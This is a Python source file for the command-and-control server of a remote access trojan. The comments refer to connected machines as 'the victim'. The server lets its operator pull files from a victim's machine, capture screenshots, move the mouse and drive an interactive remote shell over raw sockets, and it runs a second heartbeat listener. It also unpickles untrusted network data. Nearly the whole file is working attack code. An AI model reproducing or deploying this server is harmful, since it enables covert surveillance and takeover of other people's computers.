import socket
import time
import threading
import pickle


def find_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Connect the socket to a remote address (doesn't matter what address)
    s.connect(("8.8.8.8", 80))

    # Get the local IP address of the socket
    local_ip_address = s.getsockname()[0]

    # Close the socket
    s.close()

    print("Local IP address:", local_ip_address)
    return local_ip_address


my_ip = find_local_ip()
header = 16384
port = 4440
second_port = port + 1
disconnect_message = "!DISCONNECT"

# we specify what type of addresses we will connect to and how we send data
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
second_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((my_ip, port))
second_server.bind((my_ip, second_port))


def handle_client(conn, addr):
    connected = True
    command_complete = True
    print("[NEW CONNECTION] addr connected. ")

    while connected:
        if command_complete:
            command_list = ["GIVE_FILES", "SCREENSHOT", "MOVE_MOUSE", "SHELL", "DISCONNECT"]
            command = input("""Enter a command (a number between 1 and 4: 
                                1- GIVE_FILES
                                2- SCREENSHOT
                                3- MOVE_MOUSE
                                4- SHELL
                                5- DISCONNECT""")  # ask for a command from the user

            # send the command to the client

            conn.send(command_list[int(command) - 1].encode("utf-8"))
            command_complete = False

        # in recv we need to know how many bytes we want,
        # but because we can't know prior to sending the meassage we can define a header,
        # the first message is always a header which tells us the size of the incoming message.
        message_length = conn.recv(header).decode('utf-8').replace(" ", "")

        if message_length:
            message_length = int(message_length)
            message = conn.recv(message_length).decode('utf-8')
            print(f"[{addr}] {message}")

            if message == disconnect_message:
                connected = False

            if message == "TERMINAL_MSG":
                message_length = conn.recv(header).decode('utf-8')
                if message_length:
                    message_length = int(message_length)
                    message = conn.recv(message_length).decode('utf-8')
                    print(f"[{addr}] message from terminal: {message}")
                    conn.send(message.encode('utf-8'))

            if message == "GIVE_NAME":
                num = input("Enter NAME OF FILE: ")
                # send the actual message
                print(num)
                # conn.send(len(num).encode('utf-8'))
                conn.send(num.encode('utf-8'))

            if message == "MAKE_CHOICE":
                num = input("Enter message to send to client: ")
                # send the actual message
                print(num)
                # conn.send(len(num).encode('utf-8'))
                conn.send(num.encode('utf-8'))

            if message == "FILE":

                file_data = b""
                receive = True
                while receive:
                    data = conn.recv(header)
                    print(data)
                    if data == b'hello':
                        print("broke")

                        break

                    file_data += data

                print("ejhfb")
                try:
                    data = pickle.loads(file_data)
                except pickle.UnpicklingError as e:
                    print(f"[{addr}] Error: {e}")
                    break

                with open('received_pickle.pickle', 'wb') as f:
                    f.write(data)
                print(f"[{addr}] Received and saved a pickled file: received_pickle.pickle")
                f.close()
                command_complete = True

                # conn.send("RECEIVE".encode("utf-8"))

            if message == "SCREENSHOT":
                # receive the length of the pickled data
                data_length_header = conn.recv(header).strip()

                if data_length_header:
                    data_length = int(data_length_header.decode("utf-8"))

                    # receive the pickled data
                    pickled_data = b""
                    while len(pickled_data) < data_length:
                        packet = conn.recv(header)
                        pickled_data += packet

                    # deserialize the pickled data
                    try:
                        screenshot = pickle.loads(pickled_data)

                        # do something with the screenshot object here, for example, save it to a file
                        with open("screenshot.png", "wb") as f:
                            screenshot.save(f, "PNG")
                        print(f"[{addr}] Received and saved a screenshot.")
                    except pickle.UnpicklingError as e:
                        print(f"[{addr}] Error: {e}")

                # send a confirmation message to the client
                conn.send("RECEIVE".encode("utf-8"))
                command_complete = True

            if message == "MOVE_MOUSE":
                x_coordinate = input("Enter mouse's x: ")
                y_coordinate = input("Enter mouse's y: ")
                # send special message indicating a message from the terminal
                # send length of the message
                # conn.send(str(len(num)).encode('utf-8'))
                # send the actual message
                print(x_coordinate)
                print(y_coordinate)
                # conn.send(len(num).encode('utf-8'))
                conn.send(x_coordinate.encode('utf-8'))
                time.sleep(1)
                conn.send(y_coordinate.encode('utf-8'))
                command_complete = True

            if message == "SHELL":
                print('[+]Connected to shell', addr)
                while True:
                    command = input("Shell>>")
                    if command == 'exit':
                        conn.send(b'exit')
                        break

                    else:
                        conn.send(command.encode('utf-8'))
                        output = conn.recv(1024)
                        print(output)
                command_complete = True

    conn.close()


def start():
    server.listen()
    print(f"[LISTENING] the server is listening on {my_ip}....")
    while True:
        # conn is a socket object that allows us to communicate back, addr is the port and ip address of the victim.
        conn, addr = server.accept()

        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()

        print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 1}")
        print(conn, addr)


def handle_client_heartbeat(conn, addr):
    second_connected = True
    print(f"[NEW CONNECTION TO SECOND SERVER] {addr} connected. ")
    while second_connected:
        # in recv we need to know how many bytes we want,
        # but because we can't know prior to sending the message we can define a header,
        # the first message is always a header which tells us the size of the incoming message.
        message_length = conn.recv(header).decode('utf-8').replace(" ", "")

        if message_length:
            message_length = int(message_length)
            message = conn.recv(message_length).decode('utf-8')
            print(f"[{addr}] {message}")

            if message == disconnect_message:
                second_connected = False

                conn.close()


def second_start():
    second_server.listen()
    print(f"[LISTENING] the second server is listening on {my_ip}....")
    while True:
        # conn is a socket object that allows us to communicate back, addr is the port and ip address of the victim.
        conn, addr = second_server.accept()

        thread = threading.Thread(target=handle_client_heartbeat, args=(conn, addr))
        thread.start()

        print(f"[ACTIVE CONNECTIONS SECOND SERVER] {threading.active_count() - 1}")


print("[STARTING] the server is starting...")
print("[STARTING] the second server is starting...")

thread1 = threading.Thread(target=start)
thread2 = threading.Thread(target=second_start)

thread1.start()
thread2.start()
